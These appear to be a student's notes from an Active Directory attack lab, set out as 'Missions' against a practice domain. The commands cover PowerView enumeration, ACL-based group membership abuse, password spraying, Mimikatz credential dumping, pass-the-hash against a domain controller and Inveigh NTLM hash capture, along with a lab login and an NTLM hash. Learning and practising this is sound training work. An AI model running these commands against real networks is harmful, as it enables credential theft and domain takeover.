

############################ Powershell ###################################

Core CMDLETS
------------
Get-Command -Name rm
Get-Command -Noun file*
Get-Help rm
Get-Help -Name rm

Piping
------
Get-Process -Name explorer | Select-Object CPU,ProcessName
Get-Process | Where-Object ProcessName -eq explorer
Get-Process | Where-Object ProcessName -Match explo*

CMDLets Members
---------------
Get-Process | Get-Member
Get-Process -Name explorer | Select-Object path

Import Modules
--------------
cd .\Desktop\AD-Tools\
Import-Module .\PowerView.ps1
Import-Module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

Mission 1: svchost process
--------------------------
Get-Process | Where-Object Name -eq svchost | Select-Object Name,CPU | Sort-Object CPU -Descending
Get-Process -Name svchost | Sort-Object CPU -Descending

########################################### Active Directory Enumeration #############################################
Enumeration
+++++++++++
DC
--
Get-domain	
Get-domaincontroller
Get-addomain
Get-addomaincontroller

Users
-----
Get-Netuser  | select samaccountname
Get-ADUser -Filter * | select SamAccountName
Get-ADUser -Filter * | where-object {$_.SID -like "*500"}
Get-ADUser -Filter * -Properties * | select SamAccountName,LogonCount

Mission 2: SID of all Users
---------------------------
Get-ADUser -Filter * | Select SamAccountName, UserPrincipalName, SID
Get-NetUser  | select SamAccountName, UserPrincipalName, ObjectSID

OUS
---
Get-ADOrganizationalUnit -Filter *
Get-NetOU
Get-ADOrganizationalUnit -Filter * | select Name
Get-NetOU | select Name

Groups
------
Get-ADGroup -Filter *
Get-NetGroup
Get-ADGroup -Filter * | select SamAccountName
Get-NetGroup | select SamAccountName
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties * | select CN
Get-ADGroup -Filter ‘SamAccountName -eq "Domain Admins"'
Get-ADGroup -Filter ‘SamAccountName -like "*admin*"' | select DistinguishedName

Mission 3: Get OUs of All Users and Get Admins
----------------------------------------------
Get-NetUser | select SamAccountName,MemberOf
Get-ADUser -Filter * -Properties * | select SamAccountName,MemberOf
Get-ADGroupMember -Identity "Domain Admins" 
----------
Get-ADUser -Filter * -Properties * | ? {$_.MemberOf -like "*admin*"} | select SamAccountName
Get-NetUser | ? {$_.MemberOf -like "*admin*"} | select SamAccountName

Computers
---------
Get-ADComputer -Filter * | Select name
Get-ADComputer -Filter * -Properties * | Select CN,OperatingSystem, IPv4Address 

Mission 4: Get OS and ips of all computers
----------------------------------------------
Get-ADComputer -Filter * -Properties * | Select CN,OperatingSystem, IPv4Address 

Access Control
++++++++++++++
Get-ObjectAcl -SamAccountName Users | select Securityidentifier,ActivedirectoryRights
Get-ObjectAcl -SamAccountName Users -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "Extended"}
Convert-SidToName [sid]
Get-ObjectAcl -SamAccountName Users -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -like "*Generic*") -or ($_.ActiveDirectoryRights -like "*Extended*")}

Mission 5: pwnd.user permission abuse
-------------------------------------
Get-ADUser -Filter "Name -like '*pwnd*'"
Get-ObjectAcl -ResolveGUIDs | where {$_.SecurityIdentifier -like "*1106"}
Get-ObjectAcl -SamAccountName "Local Admins" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -like "*1104"}
Add-ADGroupMember -Identity 'Local Admins' -Members 'pwnd.user'
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -like "*1106"}
mkdir C:\Windows\test
rmdir C:\Windows\test

########################################### Domain Admin Hunting #############################################

Admin Hunting
+++++++++++++
Open PS as admin and import PowerView
Import-Module .\Desktop\AD-Tools\PowerView.ps1
Find-LocalAdminAccess

Mission 6: Hunting logged in Domain Admins
------------------------------------------
Login to WKS-02 : (DAdmin.user : ITDA@1234)
Invoke-UserHunter -ComputerName WKS-02

Target Domain Users Passwords
+++++++++++++++++++++++++++++
Get-ADDefaultDomainPasswordPolicy

get AD Users' Attributes
+++++++++++++++++++++++++++++
Get-ADUser -Filter * -Properties * | select SamAccountName,BadLogonCount,badpwdcount,badPasswordTime,LockedOut,Enabled | Format-Table

Mission 7: Password Spraying
+++++++++++++++++++++++++++++
Import-Module .\DomainPasswordSpray.ps1
Get-DomainUserList -Domain alto.tel -RemoveDisabled –RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
Get-Content .\userlist.txt
Invoke-DomainPasswordSpray -UserList userlist.txt -Domain alto.tel -Password HackersAcademy1!

Mission 8: Dump Hashes
++++++++++++++++++++++
Import-Module .\Invoke-Mimikatz-nishang.ps1
Invoke-Mimikatz -Command privilege::debug
Invoke-Mimikatz -Command sekurlsa::logonpasswords
Invoke-Mimikatz -DumpCreds -ComputerName WKS-02

Pass the Hash
+++++++++++++
cd '.\mimikatz_trunk-2.2.0 20210531\x64\'
mimikatz.exe
sekurlsa::pth /user:dadmin.user /domain:alto.tel /ntlm:ab17459b22bc447d860c7243f6b40436 /run:powershell.exe
dir \\dc-01\C$

Capturing Hashes with Inveigh
+++++++++++++++++++++++++++++
Import-Module .\Inveigh-master\Inveigh.ps1
Invoke-Inveigh
Watch-Inveigh -verbose
Wait at least 5 minutes......
Get-Inveigh -NTLMv2
Stop-Inveigh
